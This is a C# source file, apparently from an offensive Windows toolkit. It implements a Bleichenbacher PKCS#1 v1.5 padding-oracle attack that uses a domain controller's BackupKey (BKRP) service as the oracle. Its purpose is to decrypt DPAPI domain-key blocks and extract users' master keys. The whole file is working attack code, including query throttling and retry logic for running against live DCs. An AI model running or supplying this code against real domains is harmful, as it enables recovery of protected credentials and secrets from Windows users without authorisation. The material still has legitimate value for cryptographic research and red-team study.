using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Numerics;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;

namespace Titanis.Tbo.Smb2.PowerShell
{
	// Progress snapshot emitted during the Bleichenbacher attack.
	public sealed class BleichenbacherProgress
	{
		public int Step { get; init; }
		public long OracleQueries { get; init; }
		public int IntervalsRemaining { get; init; }
		public int BitRangeRemaining { get; init; }
		public string Message { get; init; } = string.Empty;
	}

	// Configuration for how oracle queries are made and retried.
	public sealed class BkrpOracleOptions
	{
		// Artificial delay between every oracle query (0 = no throttle).
		// Use to reduce DC load at the cost of longer attack time.
		public int QueryThrottleMs { get; init; } = 0;

		// How many times to retry a query on transient transport error.
		public int MaxRetries { get; init; } = 3;

		// Base delay (ms) before first retry; doubles on each subsequent retry.
		public int RetryBaseDelayMs { get; init; } = 500;

		// Hard upper bound on total oracle queries. Attack aborts if exceeded.
		public int MaxOracleQueries { get; init; } = 300_000;
	}

	// Bleichenbacher '98 adaptive-chosen-ciphertext attack against RSA PKCS#1 v1.5.
	//
	// Reference: Daniel Bleichenbacher, "Chosen Ciphertext Attacks Against Protocols Based
	// on the RSA Encryption Standard PKCS#1", CRYPTO 1998.
	//
	// Oracle contract:
	//   - Returns true  if the ciphertext produces a PKCS#1-conformant plaintext
	//     (i.e. BackuprKey returns 0x0 or 0x0d).
	//   - Returns false if the ciphertext is non-conformant (returns 0x57).
	internal static class BleichenbacherAttack
	{
		// Runs the full Bleichenbacher attack and returns the recovered BigInteger plaintext.
		// Throws OperationCanceledException on cancellation or InvalidOperationException on
		// query-limit breach.
		public static async Task<BigInteger> RunAsync(
			BigInteger n,
			BigInteger e,
			int keySizeBytes,
			BigInteger c0,
			Func<BigInteger, CancellationToken, Task<bool>> oracle,
			BkrpOracleOptions options,
			IProgress<BleichenbacherProgress>? progress,
			CancellationToken cancellationToken)
		{
			var B = BigInteger.Pow(2, 8 * (keySizeBytes - 2));
			var twoB = 2 * B;
			var threeB = 3 * B;
			var threeBminus1 = threeB - BigInteger.One;

			long queryCount = 0;

			async Task<bool> Query(BigInteger ct)
			{
				cancellationToken.ThrowIfCancellationRequested();

				if (queryCount >= options.MaxOracleQueries)
					throw new InvalidOperationException(
						$"Oracle query limit of {options.MaxOracleQueries} reached without convergence.");

				if (options.QueryThrottleMs > 0)
					await Task.Delay(options.QueryThrottleMs, cancellationToken).ConfigureAwait(false);

				int attempt = 0;
				while (true)
				{
					try
					{
						queryCount++;
						return await oracle(ct, cancellationToken).ConfigureAwait(false);
					}
					catch (OperationCanceledException) { throw; }
					catch when (attempt < options.MaxRetries)
					{
						attempt++;
						int delay = options.RetryBaseDelayMs * (1 << (attempt - 1));
						await Task.Delay(delay, cancellationToken).ConfigureAwait(false);
					}
				}
			}

			void Report(int step, List<(BigInteger a, BigInteger b)> M, string msg)
			{
				if (progress == null) return;
				int bits = 0;
				if (M.Count == 1)
					bits = (int)(M[0].b - M[0].a).GetBitLength();
				progress.Report(new BleichenbacherProgress
				{
					Step = step,
					OracleQueries = queryCount,
					IntervalsRemaining = M.Count,
					BitRangeRemaining = bits,
					Message = msg
				});
			}

			// Step 1: verify the original ciphertext is already PKCS#1-conformant.
			bool c0Ok = await Query(c0).ConfigureAwait(false);
			if (!c0Ok)
				throw new InvalidOperationException(
					"The target ciphertext is not PKCS#1-conformant. " +
					"Verify the DomainKey block's RSA ciphertext is correct and the DC backup key GUID matches.");

			Report(1, new List<(BigInteger, BigInteger)> { (twoB, threeBminus1) }, "Ciphertext confirmed conformant.");

			var M = new List<(BigInteger a, BigInteger b)> { (twoB, threeBminus1) };
			BigInteger s = BigInteger.Zero;

			for (int i = 1; ; i++)
			{
				cancellationToken.ThrowIfCancellationRequested();

				// Step 2: find next s.
				if (i == 1)
				{
					// Step 2a: start from ceil(n / 3B).
					s = CeilDiv(n, threeB);
					Report(2, M, $"Step 2a: searching for first conformant s (starting at {s})…");
					while (!await Query(BlindedCiphertext(c0, s, e, n)).ConfigureAwait(false))
					{
						s++;
						if (queryCount % 1000 == 0)
							Report(2, M, $"Step 2a: {queryCount} queries so far, s={s}");
					}
					Report(2, M, $"Step 2a: found first conformant s={s} after {queryCount} queries.");
				}
				else if (M.Count > 1)
				{
					// Step 2b: increment s by 1 and search.
					s++;
					while (!await Query(BlindedCiphertext(c0, s, e, n)).ConfigureAwait(false))
						s++;
				}
				else
				{
					// Step 2c: single interval — use the tight search window.
					var (a, b) = M[0];
					var r = CeilDiv(2 * (b * s - twoB), n);
					bool found = false;
					while (!found)
					{
						cancellationToken.ThrowIfCancellationRequested();
						var sLo = CeilDiv(twoB + r * n, b);
						var sHi = (threeBminus1 + r * n) / a;  // floor
						for (var sTest = sLo; sTest <= sHi; sTest++)
						{
							if (await Query(BlindedCiphertext(c0, sTest, e, n)).ConfigureAwait(false))
							{
								s = sTest;
								found = true;
								break;
							}
						}
						if (!found) r++;
					}

					if (queryCount % 500 == 0)
						Report(3, M, $"Step 2c: {queryCount} queries, {(int)(M[0].b - M[0].a).GetBitLength()} bits remaining.");
				}

				// Step 3: narrow the set of intervals.
				var M2 = new List<(BigInteger a, BigInteger b)>();
				foreach (var (a, b) in M)
				{
					var rLo = CeilDiv(a * s - threeBminus1, n);
					var rHi = (b * s - twoB) / n;  // floor
					for (var r = rLo; r <= rHi; r++)
					{
						var newA = BigInteger.Max(a, CeilDiv(twoB + r * n, s));
						var newB = BigInteger.Min(b, (threeBminus1 + r * n) / s);
						if (newA <= newB)
							M2.Add((newA, newB));
					}
				}
				M = M2;

				if (M.Count == 0)
					throw new InvalidOperationException("Interval set became empty — oracle may be unreliable.");

				// Step 4: check for convergence.
				if (M.Count == 1 && M[0].a == M[0].b)
				{
					Report(4, M, $"Converged after {queryCount} oracle queries.");
					return M[0].a;
				}

				if (i % 100 == 0)
					Report(i, M, $"Round {i}: {queryCount} queries, {M.Count} intervals.");
			}
		}

		// Computes (c0 * s^e mod n) mod n — the blinding transformation.
		private static BigInteger BlindedCiphertext(BigInteger c0, BigInteger s, BigInteger e, BigInteger n)
			=> (c0 * BigInteger.ModPow(s, e, n)) % n;

		// Ceiling division for positive BigIntegers: ceil(a / b).
		private static BigInteger CeilDiv(BigInteger a, BigInteger b)
			=> (a + b - BigInteger.One) / b;
	}

	// Orchestrates the full domain-key decryption:
	//   1. Retrieve the DC's RSA public key.
	//   2. Run the Bleichenbacher oracle attack.
	//   3. Strip PKCS#1 padding and parse the plaintext to recover the master key.
	internal static class DomainKeyDecryption
	{
		public static async Task<byte[]> DecryptMasterKeyAsync(
			BkrpSession session,
			DpapiDomainKeyBlock domainKey,
			BkrpOracleOptions options,
			IProgress<BleichenbacherProgress>? progress,
			CancellationToken cancellationToken)
		{
			if (session == null) throw new ArgumentNullException(nameof(session));
			if (domainKey == null) throw new ArgumentNullException(nameof(domainKey));
			if (options == null) throw new ArgumentNullException(nameof(options));

			// 1. Fetch RSA public key from the DC.
			var pubKey = await session.GetBackupPublicKeyAsync(cancellationToken).ConfigureAwait(false);
			int k = pubKey.KeySizeBytes;

			// The SecretData in the file is stored little-endian; Bleichenbacher works in big-endian.
			var ctLittleEndian = domainKey.SecretData;
			if (ctLittleEndian.Length != k)
				throw new InvalidOperationException(
					$"DomainKey ciphertext length ({ctLittleEndian.Length}) does not match RSA key size ({k} bytes).");

			// Reverse to big-endian and interpret as unsigned BigInteger.
			var ctBigEndian = (byte[])ctLittleEndian.Clone();
			Array.Reverse(ctBigEndian);
			var c0 = new BigInteger(ctBigEndian, isUnsigned: true, isBigEndian: true);

			// 2. Define the oracle: query the DC and observe the Win32 error code.
			async Task<bool> Oracle(BigInteger candidate, CancellationToken ct)
			{
				// Convert BigInteger back to k-byte little-endian blob for the DC.
				var blobCt = BigIntegerToLittleEndianBytes(candidate, k);
				var oracleBlob = domainKey.BuildOracleBlob(blobCt);
				var result = await session.QueryOracleAsync(oracleBlob, ct).ConfigureAwait(false);
				return result.IsPaddingValid;
			}

			// 3. Run Bleichenbacher.
			var m = await BleichenbacherAttack.RunAsync(
				pubKey.Modulus, pubKey.Exponent, k, c0,
				Oracle, options, progress, cancellationToken).ConfigureAwait(false);

			// 4. Convert recovered integer to big-endian bytes.
			var raw = BigIntegerToBigEndianBytes(m, k);

			// 5. Strip PKCS#1 v1.5 padding: 0x00 0x02 [non-zero random bytes] 0x00 [plaintext]
			int terminator = Array.IndexOf(raw, (byte)0, 2);
			if (terminator < 2 || terminator >= raw.Length - 1)
				throw new InvalidDataException("Recovered value does not have valid PKCS#1 v1.5 padding.");

			int ptStart = terminator + 1;
			int ptLength = raw.Length - ptStart;

			// 6. Parse the BKRP plaintext to extract the 64-byte DPAPI master key.
			//    Layout (v2): secret_len(4) + key_len(4) + secret[secret_len] + sym_key[key_len]
			//    Layout (v3): secret_len(4) + key_len(4) + 8-byte reserved + secret[secret_len] + ...
			if (ptLength < 8)
				throw new InvalidDataException("BKRP plaintext is too short to contain a master key.");

			var secretLen = (int)BinaryPrimitives.ReadUInt32LittleEndian(new ReadOnlySpan<byte>(raw, ptStart, 4));
			int headerSize = domainKey.Version >= 3 ? 16 : 8;

			if (ptLength < headerSize + secretLen)
				throw new InvalidDataException(
					$"BKRP plaintext too short: expected {headerSize + secretLen} bytes, got {ptLength}.");

			var masterKeyBytes = new byte[secretLen];
			Array.Copy(raw, ptStart + headerSize, masterKeyBytes, 0, secretLen);
			return masterKeyBytes;
		}

		// Convert BigInteger to a fixed-width little-endian byte array.
		private static byte[] BigIntegerToLittleEndianBytes(BigInteger value, int length)
		{
			// ToByteArray(isUnsigned:true) returns LE; may be shorter than `length` if leading zeros
			var leBytes = value.ToByteArray(isUnsigned: true, isBigEndian: false);
			if (leBytes.Length == length)
				return leBytes;

			var result = new byte[length];
			var copyLen = Math.Min(leBytes.Length, length);
			leBytes.AsSpan(0, copyLen).CopyTo(result);
			return result;
		}

		// Convert BigInteger to a fixed-width big-endian byte array.
		private static byte[] BigIntegerToBigEndianBytes(BigInteger value, int length)
		{
			var beBytes = value.ToByteArray(isUnsigned: true, isBigEndian: true);
			if (beBytes.Length == length)
				return beBytes;

			var result = new byte[length];
			var copyLen = Math.Min(beBytes.Length, length);
			int offset = length - copyLen;
			beBytes.AsSpan(0, copyLen).CopyTo(result.AsSpan(offset));
			return result;
		}
	}
}
